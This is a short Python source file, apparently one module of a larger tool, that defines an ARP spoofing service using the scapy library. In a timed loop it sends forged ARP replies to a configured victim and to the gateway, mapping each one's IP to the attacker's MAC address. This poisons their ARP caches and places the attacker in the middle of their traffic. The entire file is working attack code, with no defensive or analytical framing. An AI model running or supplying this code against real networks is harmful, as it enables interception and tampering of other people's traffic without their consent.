from scapy.all import ARP, Ether, sendp
from time import sleep
from service import Service

class ARPService(Service):
    def start(self):
        while not self.shouldStop():
            sleep(self.config.arp_sleep_time)
            self.send(self.config.victim, self.config.gateway.getIP())
            self.send(self.config.gateway, self.config.victim.getIP())

    def send(self, victim, ipToSpoof):
        # Setup the ARP poisoning
        arp = Ether() / ARP()
        arp[Ether].src = self.config.attacker.getMAC()
        arp[ARP].hwsrc = self.config.attacker.getMAC()
        arp[ARP].psrc = ipToSpoof
        arp[ARP].hwdst = victim.getMAC()
        arp[ARP].pdst = victim.getIP()

        # Send the ARP poisoning
        sendp(arp, iface = self.config.iface, verbose=False)
        print("[ARP] Sent to {} : {} is-at {}".format(victim.getMAC(), ipToSpoof, self.config.attacker.getMAC()))